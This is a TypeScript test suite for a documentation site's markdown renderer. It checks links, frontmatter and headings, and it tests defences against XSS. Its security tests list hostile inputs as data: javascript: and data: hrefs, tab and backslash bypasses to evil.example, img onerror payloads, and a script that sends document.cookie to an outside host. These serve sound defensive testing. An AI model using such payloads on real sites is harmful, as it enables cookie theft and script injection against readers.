import { readdir, readFile } from 'node:fs/promises';
import { join } from 'node:path';
import { describe, expect, it } from 'vitest';

import { jsonLd } from '@/lib/json-ld';
import { SITE_ORIGIN } from '@/lib/site';
import { escapeHtml, highlight } from './highlight';
import { extractFaq, renderMarkdown } from './markdown';
import { DOC_SLUGS, DOCS_SECTIONS } from './nav';

/**
 * The documentation's own tests.
 *
 * Published documentation is a product surface, and it fails the way products
 * fail: a page nobody linked, a link nobody followed, a heading anchor that
 * stopped existing when somebody reworded a title. None of that is caught by
 * reading the diff, and all of it is caught here.
 *
 * These run against the real files in `public/docs`, not fixtures.
 */

/**
 * Resolved from this file rather than from `process.cwd()`.
 *
 * `content.ts` uses the working directory because that is what Next guarantees
 * during `next build`. A test should not inherit that assumption: run from the
 * repository root instead of from `apps/web` and every assertion below would
 * fail on a missing directory, which reads as "the documentation is broken"
 * rather than "you are standing somewhere else".
 */
const CONTENT_ROOT = join(import.meta.dirname, '..', '..', '..', '..', 'public', 'docs');

async function markdownFiles(dir = CONTENT_ROOT, prefix = ''): Promise<string[]> {
  const entries = await readdir(dir, { withFileTypes: true });
  const found: string[] = [];

  for (const entry of entries) {
    if (entry.isDirectory()) {
      found.push(...(await markdownFiles(join(dir, entry.name), `${prefix}${entry.name}/`)));
    } else if (entry.name.endsWith('.md')) {
      found.push(`${prefix}${entry.name.replace(/\.md$/, '')}`);
    }
  }

  return found;
}

interface LoadedDoc {
  slug: string;
  frontmatter: string;
  body: string;
}

async function loadAll(): Promise<LoadedDoc[]> {
  return Promise.all(
    DOC_SLUGS.map(async (slug) => {
      const raw = await readFile(join(CONTENT_ROOT, `${slug}.md`), 'utf8');
      const match = /^---\r?\n([\s\S]*?)\r?\n---\r?\n?/.exec(raw);
      return {
        slug,
        frontmatter: match?.[1] ?? '',
        body: match ? raw.slice(match[0].length) : raw,
      };
    }),
  );
}

describe('the manifest and the files agree', () => {
  it('lists every markdown file exactly once', async () => {
    const onDisk = (await markdownFiles()).sort();
    expect([...DOC_SLUGS].sort()).toEqual(onDisk);
  });

  it('lists no slug twice', () => {
    expect(new Set(DOC_SLUGS).size).toBe(DOC_SLUGS.length);
  });

  it('gives every section at least one page', () => {
    for (const section of DOCS_SECTIONS) {
      expect(section.slugs.length, `${section.title} is empty`).toBeGreaterThan(0);
    }
  });
});

describe('frontmatter', () => {
  it('states a title, a description, keywords and a date on every page', async () => {
    for (const doc of await loadAll()) {
      for (const key of ['title', 'description', 'keywords', 'updated']) {
        expect(doc.frontmatter, `${doc.slug} is missing "${key}"`).toMatch(
          new RegExp(`^${key}:\\s*\\S`, 'm'),
        );
      }
    }
  });

  it('keeps meta descriptions inside the length a search result shows', async () => {
    for (const doc of await loadAll()) {
      const description = /^description:\s*(.+)$/m.exec(doc.frontmatter)?.[1] ?? '';
      // Google truncates around 155–160 characters. Over that is not an error
      // in itself, but it means the tail of the sentence is decoration rather
      // than something a searcher reads; 200 is where it stops being a summary.
      expect(
        description.length,
        `${doc.slug} description is ${description.length} chars`,
      ).toBeLessThanOrEqual(200);
      expect(
        description.length,
        `${doc.slug} description is too short to be useful`,
      ).toBeGreaterThan(40);
    }
  });

  it('never repeats a title between pages', async () => {
    const titles = (await loadAll()).map((doc) => /^title:\s*(.+)$/m.exec(doc.frontmatter)?.[1]);
    expect(new Set(titles).size).toBe(titles.length);
  });

  it('starts every body below the frontmatter title, never with its own h1', async () => {
    // The page's `<h1>` is rendered from frontmatter. A second one in the body
    // is two competing top-level headings, which is both an outline bug and an
    // SEO one.
    //
    // Checked against the rendered HTML rather than against `^# ` in the
    // source: shell and YAML comments inside fenced blocks start with `# ` too,
    // and a test that cannot tell a comment from a heading is a test that gets
    // disabled.
    for (const doc of await loadAll()) {
      const { html } = renderMarkdown(doc.body, doc.slug);
      expect(html, `${doc.slug} contains an h1`).not.toContain('<h1');
    }
  });
});

describe('links resolve', () => {
  it('points every internal link at a page that exists', async () => {
    const docs = await loadAll();
    const anchors = new Map<string, Set<string>>();

    for (const doc of docs) {
      anchors.set(doc.slug, new Set(renderMarkdown(doc.body, doc.slug).toc.map((e) => e.id)));
    }

    // Explicit `{#id}` anchors do not appear in the h2/h3 contents list when
    // they sit on a heading of another depth, so collect them separately.
    for (const doc of docs) {
      for (const match of doc.body.matchAll(/\{#([\w-]+)\}/g)) {
        anchors.get(doc.slug)?.add(match[1] as string);
      }
    }

    const broken: string[] = [];

    for (const doc of docs) {
      const { html } = renderMarkdown(doc.body, doc.slug);

      for (const match of html.matchAll(/<a href="(\/docs[^"#]*)(#[^"]*)?"/g)) {
        const target = (match[1] as string).replace(/^\/docs\/?/, '');
        if (target !== '' && !DOC_SLUGS.includes(target)) {
          broken.push(`${doc.slug} → ${match[1]} (no such page)`);
          continue;
        }

        const fragment = match[2]?.slice(1);
        if (fragment && target !== '' && !anchors.get(target)?.has(fragment)) {
          broken.push(`${doc.slug} → ${match[1]}#${fragment} (no such heading)`);
        }
      }

      // Same-page anchors.
      for (const match of html.matchAll(/<a href="#([^"]+)"/g)) {
        const fragment = match[1] as string;
        if (!anchors.get(doc.slug)?.has(fragment)) {
          broken.push(`${doc.slug} → #${fragment} (no such heading on this page)`);
        }
      }
    }

    expect(broken).toEqual([]);
  });

  it('leaves no raw .md path in the rendered output', async () => {
    for (const doc of await loadAll()) {
      const { html } = renderMarkdown(doc.body, doc.slug);
      // A `.md` inside an href means a relative link the rewriter did not
      // recognise — it would 404 for a reader while working fine in an editor.
      expect(html, `${doc.slug} has an unrewritten .md link`).not.toMatch(/href="[^"]*\.md"/);
    }
  });
});

describe('rendering', () => {
  it('gives every page a contents list', async () => {
    for (const doc of await loadAll()) {
      const { toc } = renderMarkdown(doc.body, doc.slug);
      expect(toc.length, `${doc.slug} has fewer than two sections`).toBeGreaterThanOrEqual(2);
    }
  });

  it('never emits a duplicate heading id', async () => {
    for (const doc of await loadAll()) {
      const { html } = renderMarkdown(doc.body, doc.slug);
      const ids = [...html.matchAll(/<h[23] id="([^"]+)"/g)].map((match) => match[1]);
      expect(new Set(ids).size, `${doc.slug} has a duplicate heading id`).toBe(ids.length);
    }
  });

  it('knows every fence language the documentation actually uses', async () => {
    // A fence whose language has no rule set renders as plain text, which looks
    // like a styling bug rather than a missing entry in `ALIASES`. `text` is
    // the deliberate opt-out for directory trees and terminal transcripts.
    const unknown = new Set<string>();

    for (const doc of await loadAll()) {
      for (const match of doc.body.matchAll(/^```([a-zA-Z][\w+-]*)/gm)) {
        const lang = match[1] as string;
        if (['text', 'txt'].includes(lang)) continue;
        // `highlight` returns the input escaped and unchanged when it has no
        // rules, so a sample containing a comment is the cheapest probe.
        if (highlight('# x\n"y"', lang) === escapeHtml('# x\n"y"')) unknown.add(lang);
      }
    }

    expect([...unknown]).toEqual([]);
  });

  it('rewrites relative links against the linking document’s directory', () => {
    const { html } = renderMarkdown('[a](../faq.md) [b](commands.md) [c](/docs/api)', 'cli/x');
    expect(html).toContain('href="/docs/faq"');
    expect(html).toContain('href="/docs/cli/commands"');
    expect(html).toContain('href="/docs/api"');
  });

  it('honours an explicit heading id', () => {
    const { html, toc } = renderMarkdown('## The golden path {#run}', 'x');
    expect(html).toContain('id="run"');
    expect(html).not.toContain('{#run}');
    expect(toc[0]?.title).toBe('The golden path');
  });

  it('starts every callout body as its own sentence', async () => {
    // `> **Warning** — every one of these…` reads fine in the source and wrong
    // on the page, because the label is lifted out into its own element and the
    // body then opens mid-sentence with a lower-case word. Backticks and the
    // product's own lower-case name are legitimate openings.
    const wrong: string[] = [];

    for (const doc of await loadAll()) {
      for (const match of doc.body.matchAll(
        /^> \*\*(?:Note|Tip|Warning|Important)\*\*\s*(?:—|-|:)?\s*(\S+)/gm,
      )) {
        const opener = match[1] as string;
        if (/^[`*[(]/.test(opener) || opener.startsWith('xecret')) continue;
        if (opener[0] !== opener[0]?.toUpperCase()) wrong.push(`${doc.slug}: “${opener}…”`);
      }
    }

    expect(wrong).toEqual([]);
  });

  it('turns a marked blockquote into a callout', () => {
    const { html } = renderMarkdown('> **Warning** — do not do that.', 'x');
    expect(html).toContain('doc-callout-warning');
    expect(html).not.toContain('<strong>Warning</strong>');
  });

  it('leaves an unmarked blockquote as a quote', () => {
    const { html } = renderMarkdown('> just a quotation', 'x');
    expect(html).toContain('doc-quote');
  });

  it('opens external links in a new tab without handing over the opener', () => {
    const { html } = renderMarkdown('[x](https://example.com)', 'x');
    expect(html).toContain('rel="noreferrer noopener"');
  });
});

describe('the link renderer will only emit a destination it vouched for', () => {
  /**
   * Every document under `public/docs` is written in this repository, so none
   * of the inputs below can reach the renderer today. They are here because the
   * renderer outlives that guarantee: the moment it is pointed at a collection
   * somebody else writes, a `javascript:` href is a stored XSS, and escaping
   * the attribute — which is all `escapeHtml` does — never touched the scheme.
   */
  function hrefsIn(markdown: string): string[] {
    const { html } = renderMarkdown(markdown, 'x');
    return [...html.matchAll(/<a href="([^"]*)"/g)].map((match) => match[1] as string);
  }

  /**
   * Where an emitted href would actually take a reader.
   *
   * Resolved rather than read, because reading is what the bypasses below are
   * built to exploit: `/<tab>/evil.example` starts with a `/` and ends up on
   * somebody else's origin, so an assertion phrased as "it starts with a slash,
   * therefore it is ours" agrees with the attack. `URL` strips the tab exactly
   * as a browser does and then says where the link goes.
   */
  function originsOf(markdown: string): string[] {
    return hrefsIn(markdown).map((href) => new URL(href, SITE_ORIGIN).origin);
  }

  const hostile = [
    ['a javascript scheme', 'javascript:alert(1)'],
    ['a javascript scheme in mixed case', 'JaVaScRiPt:alert(1)'],
    // Written inside `<…>` because that is the only link form marked will
    // parse with whitespace in the destination — and a browser strips the tab
    // back out again, so what parses as inert is what navigates.
    ['a tab inside the scheme', '<java\tscript:alert(1)>'],
    ['a leading space', ' javascript:alert(1)'],
    ['data', 'data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=='],
    ['vbscript', 'vbscript:msgbox(1)'],
    ['file', 'file:///etc/passwd'],
    // No scheme for the allowlist to see: these leave the site while reading
    // as a path on it.
    ['a scheme-relative host', '//evil.example/steal'],
    ['a backslash standing in for the second slash', '/\\evil.example'],
    ['a backslash pair', '/\\\\evil.example'],
    // The tab is stripped by the URL parser *after* any string guard has read
    // the href, which reassembles the two characters the guard was looking for.
    ['a tab reassembling a scheme-relative host', '</\t/evil.example>'],
    ['a tab reassembling one with a backslash', '</\t\\evil.example>'],
  ] as const;

  for (const [name, href] of hostile) {
    it(`refuses ${name}`, () => {
      const markdown = `[click](${href})`;
      const { html } = renderMarkdown(markdown, 'x');

      // The words survive — a refused link is not a deleted sentence.
      expect(html).toContain('click');

      // And no anchor reaches the document at all. Asserted as an equality on
      // the whole list rather than as a loop over it: a loop over an empty list
      // runs no assertions and passes for the wrong reason, which is how the
      // first version of this file came to accept two of the entries above.
      expect(hrefsIn(markdown), `${name} reached the document as a link`).toEqual([]);
      expect(html, `${name} emitted an anchor`).not.toContain('<a ');
    });
  }

  it('leaves the schemes documentation actually uses alone', () => {
    expect(hrefsIn('[x](https://example.com/a?b=1#c)')).toEqual(['https://example.com/a?b=1#c']);
    expect(hrefsIn('[x](http://localhost:8787)')).toEqual(['http://localhost:8787']);
    expect(hrefsIn('[x](HTTPS://Example.com)')).toEqual(['HTTPS://Example.com']);
    expect(hrefsIn('[x](mailto:support@example.com)')).toEqual(['mailto:support@example.com']);
  });

  it('normalises nothing, so an obfuscated spelling of an allowed scheme is refused too', () => {
    // `htt<tab>ps:` is `https:` to a browser, and is not `https` to the
    // allowlist. That asymmetry is the design: refusal comes from failing to
    // equal one of three strings, never from recognising a dangerous one, so
    // an obfuscation nobody has thought of yet fails by default. Normalising
    // the tab away — which this renderer used to do, on the reasoning that a
    // browser does — can only ever turn a refusal into an acceptance.
    expect(hrefsIn('[x](<htt\tps://example.com>)')).toEqual([]);
    expect(hrefsIn('[x](<java\tscript:alert(1)>)')).toEqual([]);
  });

  it('never lets a character reference become a scheme', () => {
    // Not a hole this renderer ever had, and here so that it stays that way:
    // marked does not decode entities in a destination, so `&#106;avascript:`
    // reaches the renderer with a literal `#` in it, which stops it looking
    // like a scheme at all and leaves it a path. Should marked ever start
    // decoding them, the allowlist above catches the decoded `javascript:` —
    // but the reason to check is that only one of those two facts is ours.
    for (const reference of ['&#106;avascript:alert(1)', 'javascript&#58;alert(1)']) {
      const markdown = `[click](${reference})`;
      expect(originsOf(markdown), reference).toEqual([SITE_ORIGIN]);
      expect(renderMarkdown(markdown, 'x').html.toLowerCase()).not.toContain('href="javascript');
    }
  });

  it('resolves every href it does emit for an internal link onto this origin', () => {
    // The invariant the shape checks exist to produce, stated as the browser
    // would evaluate it. `[d]` is one leading backslash — *not* the trick
    // above: it resolves to a path on this site, and refusing it too would
    // only break an author who mistyped a slash.
    const markdown = '[a](../faq.md#pin) [b](/docs/api) [c](#top) [d](\\\\evil.example)';

    expect(hrefsIn(markdown)).toEqual([
      '/docs/faq#pin',
      '/docs/api',
      '#top',
      '/docs/\\evil.example',
    ]);
    expect(originsOf(markdown)).toEqual([SITE_ORIGIN, SITE_ORIGIN, SITE_ORIGIN, SITE_ORIGIN]);
  });

  it('gives every link that does leave the site the opener guard', () => {
    // The rule the file states. Asserted over the shapes that can still reach
    // the document at all, so a future scheme added to the allowlist has to
    // decide this question rather than inherit an answer.
    const { html } = renderMarkdown('[a](https://example.com) [b](/docs/api) [c](#top)', 'x');
    const outbound = [...html.matchAll(/<a href="(https?:[^"]*)"[^>]*>/g)].map((m) => m[0]);

    expect(outbound).toHaveLength(1);
    expect(outbound[0]).toContain('rel="noreferrer noopener"');
  });

  it('leaves relative, absolute and same-page links alone', () => {
    expect(hrefsIn('[x](../faq.md#pin)')).toEqual(['/docs/faq#pin']);
    expect(hrefsIn('[x](/docs/api)')).toEqual(['/docs/api']);
    expect(hrefsIn('[x](#a-heading)')).toEqual(['#a-heading']);
    // A colon after a slash or a hash belongs to the path or the fragment, not
    // to a scheme, and must not be read as one.
    expect(hrefsIn('[x](../cli/commands.md#run:once)')).toEqual(['/docs/cli/commands#run:once']);
  });
});

describe('raw HTML in a document is shown, never run', () => {
  /**
   * `marked` has had no sanitiser since v5, and this output goes straight into
   * `dangerouslySetInnerHTML` on a page rendered during `next build` — so a tag
   * that survives the renderer is a tag in the static HTML file, executed as
   * the browser parses it, with no Content-Security-Policy anywhere in this
   * application to stop it afterwards.
   *
   * Asserted as "no element of this name exists in the output" rather than as
   * "the word `onerror` is absent": the escaped text still reads `onerror=`,
   * and it is meant to — the point is that it is text.
   */
  const vectors = [
    ['a script block', '<script>fetch("https://evil.example?c="+document.cookie)</script>'],
    ['a tag mid-sentence', 'A sentence <a href="javascript:alert(1)">with this</a> inside it.'],
    ['an event handler on an image', '<img src=x onerror="alert(document.domain)">'],
    ['a tag inside a table cell', '| head |\n| --- |\n| <img src=x onerror=alert(1)> |'],
    ['a tag inside a list item', '- <img src=x onerror=alert(1)>'],
    ['a tag inside a blockquote', '> <img src=x onerror=alert(1)>'],
    // marked flags text inside `<pre>`, `<code>`, `<kbd>` and `<script>` as
    // already escaped so that raw HTML around it survives. `<img/src=…>` is a
    // tag its inline tokenizer does not recognise and every browser does, so it
    // arrives as "escaped" text and would reach the document verbatim.
    ['a tag the tokenizer misses, inside a raw block', 'text <pre>a <img/src=x onerror=alert(1)>'],
  ] as const;

  for (const [name, markdown] of vectors) {
    it(`escapes ${name}`, () => {
      const { html } = renderMarkdown(markdown, 'x');

      for (const tag of ['script', 'img', 'a', 'iframe', 'svg']) {
        expect(html.toLowerCase(), `${name} emitted a live <${tag}>`).not.toContain(`<${tag}`);
      }
      expect(html, `${name} vanished instead of being shown`).toContain('&lt;');
    });
  }

  it('still lets a document show what a script tag looks like', () => {
    // The reason this is escaped rather than dropped, and the reason the code
    // renderers are separate: documentation about HTML has to be able to print
    // HTML.
    const { html } = renderMarkdown(
      '```html\n<script>alert(1)</script>\n```\n\nOr `<script>`.',
      'x',
    );

    expect(html).toContain('&lt;script&gt;alert(1)&lt;/script&gt;');
    expect(html).toContain('<code>&lt;script&gt;</code>');
    expect(html.toLowerCase()).not.toContain('<script');
  });
});

describe('the image renderer will only load from this origin', () => {
  function srcsIn(markdown: string): string[] {
    const { html } = renderMarkdown(markdown, 'cli/x');
    return [...html.matchAll(/<img src="([^"]*)"/g)].map((match) => match[1] as string);
  }

  it('refuses a scheme, exactly as the link renderer does', () => {
    expect(srcsIn('![a](javascript:alert(1))')).toEqual([]);
    expect(srcsIn('![a](data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMSk+)')).toEqual([]);
  });

  it('refuses an off-site image even over https', () => {
    // Not a scheme problem. Nobody clicks an image: the browser fetches it
    // while the page is still arriving, so a third-party `<img>` hands that
    // host every reader's address, user agent and referring URL, silently and
    // with nothing on the page to notice.
    expect(srcsIn('![a](https://evil.example/pixel.png)')).toEqual([]);
    expect(srcsIn('![a](//evil.example/pixel.png)')).toEqual([]);
    expect(srcsIn('![a](/\\evil.example/pixel.png)')).toEqual([]);
  });

  it('refuses a reference-style source the same way', () => {
    expect(srcsIn('![a][b]\n\n[b]: javascript:alert(1)')).toEqual([]);
    expect(srcsIn('![a][b]\n\n[b]: https://evil.example/pixel.png')).toEqual([]);
  });

  it('keeps the description when it refuses the picture', () => {
    const { html } = renderMarkdown('![the trust boundary](https://evil.example/p.png)', 'x');
    expect(html).toContain('the trust boundary');
    expect(html).not.toContain('<img');
  });

  it('resolves a relative source against the document’s own directory', () => {
    // `./diagram.png` beside `public/docs/cli/x.md` is served at
    // `/docs/cli/diagram.png`. Emitted unrewritten it resolves against whatever
    // URL the reader is on instead, and 404s from every page but one.
    expect(srcsIn('![a](./diagram.png)')).toEqual(['/docs/cli/diagram.png']);
    expect(srcsIn('![a](diagram.png)')).toEqual(['/docs/cli/diagram.png']);
    expect(srcsIn('![a](../shared/diagram.png)')).toEqual(['/docs/shared/diagram.png']);
    expect(srcsIn('![a](/logo.svg)')).toEqual(['/logo.svg']);
  });

  it('escapes the alt text rather than letting it end the attribute', () => {
    const { html } = renderMarkdown('![" onerror="alert(1)](./a.png)', 'x');
    expect(html).toContain('alt="&quot; onerror=&quot;alert(1)"');
  });
});

describe('structured data cannot end its own script block', () => {
  it('escapes the angle brackets a JSON parser does not care about', () => {
    expect(jsonLd({ a: '</script>' })).toBe('{"a":"\\u003c/script\\u003e"}');
    expect(jsonLd({ a: '</script><script>alert(1)</script>' })).not.toContain('<');
  });

  it('still round-trips, so a crawler reads exactly what was written', () => {
    const data = { headline: 'Angle < brackets >, an & ampersand, and a “quote”' };
    expect(JSON.parse(jsonLd(data))).toEqual(data);
  });

  it('survives an answer the FAQ extractor decoded back into a tag', () => {
    // `stripTags` turns `&lt;` back into `<` deliberately — schema.org wants
    // the answer as text — so a document containing no tag at all still hands
    // a literal `</script>` to the serialiser. Nothing has to be authored in
    // bad faith for this to happen; `&lt;/script&gt;` is how you write about
    // one.
    const { html } = renderMarkdown(
      '### Is it safe?\n\nYes. &lt;/script&gt;&lt;script&gt;alert(1)&lt;/script&gt;\n',
      'faq',
    );
    const faq = extractFaq(html);

    expect(faq[0]?.answer, 'the fixture no longer reproduces the decode').toContain('</script>');
    expect(jsonLd({ mainEntity: faq })).not.toContain('</script>');
  });

  it('escapes a frontmatter title carrying a tag', () => {
    expect(jsonLd({ headline: 'Tokens </script><script>alert(1)</script>' })).not.toContain('<');
  });

  it('is what both documentation pages actually serialise with', async () => {
    // Asserted against the source because the alternative is rendering a
    // Server Component in a test runner that has no DOM. The failure it guards
    // is a one-word edit — `JSON.stringify` reads as obviously correct in a
    // `dangerouslySetInnerHTML`, and is not.
    for (const page of ['page.tsx', join('[...slug]', 'page.tsx')]) {
      const source = await readFile(join(import.meta.dirname, '..', page), 'utf8');

      expect(source, `docs/${page} no longer emits structured data`).toContain(
        'application/ld+json',
      );
      expect(source, `docs/${page} serialises it with JSON.stringify`).not.toMatch(
        /__html:\s*JSON\.stringify/,
      );
    }
  });
});

describe('a documentation link is never signalled by colour alone', () => {
  /**
   * WCAG 1.4.1, checked against the source: this runner has no DOM, and adding
   * a rendering dependency to assert on one class list and one CSS declaration
   * would cost more than the fidelity is worth.
   *
   * The rule matters more than usual here because the palette is moving to one
   * where `--accent-text` and `--fg` hold the same value, at which point every
   * affordance built out of the accent colour silently becomes nothing.
   */
  it('gives the inline contents list an underline on hover', async () => {
    const source = await readFile(
      join(import.meta.dirname, '..', '_components', 'table-of-contents.tsx'),
      'utf8',
    );
    // The inline list is the only table of contents below `xl` — every phone
    // and most laptops — and its rows have no border and no background, so a
    // tint was the whole of its hover feedback.
    const inline = source.slice(source.indexOf('export function InlineTableOfContents'));

    expect(inline, 'the only contents list below `xl` still answers in hue alone').toContain(
      'hover:underline',
    );
  });

  it('underlines generated prose links strongly enough to read without the colour', async () => {
    const css = await readFile(join(import.meta.dirname, '..', 'docs.css'), 'utf8');
    const rule = /\.doc-prose a \{([\s\S]*?)\}/.exec(css)?.[1];

    expect(rule, '.doc-prose has no link rule any more').toBeDefined();

    const alpha = /text-decoration-color:[^;]*?currentcolor\s+(\d+)%/.exec(rule ?? '')?.[1];
    expect(
      alpha,
      'the underline is tinted from something other than the link colour',
    ).toBeDefined();
    // 35% was chosen while the accent colour was carrying the signal.
    expect(Number(alpha), 'the underline is still tuned as a hint beside a colour').toBeGreaterThan(
      50,
    );
  });
});

describe('the highlighter cannot emit unescaped markup', () => {
  it('escapes HTML in every supported language', () => {
    const hostile = `<img src=x onerror="alert(1)"> & 'quoted' "double"`;
    const languages = ['bash', 'json', 'yaml', 'ts', 'go', 'env', 'http', 'sql', 'dockerfile'];
    for (const lang of [...languages, undefined]) {
      const out = highlight(hostile, lang);
      expect(out, `${lang} leaked a tag`).not.toMatch(/<(?!\/?span)/);
      expect(out).toContain('&lt;img');
    }
  });

  it('preserves the source text exactly once the spans are removed', () => {
    const source = 'export TOKEN="abc" # a comment\n';
    const stripped = highlight(source, 'bash')
      .replace(/<\/?span[^>]*>/g, '')
      .replace(/&lt;/g, '<')
      .replace(/&gt;/g, '>')
      .replace(/&quot;/g, '"')
      .replace(/&#39;/g, "'")
      .replace(/&amp;/g, '&');
    expect(stripped).toBe(source);
  });

  it('escapes the five characters that matter', () => {
    expect(escapeHtml(`<>&"'`)).toBe('&lt;&gt;&amp;&quot;&#39;');
  });
});
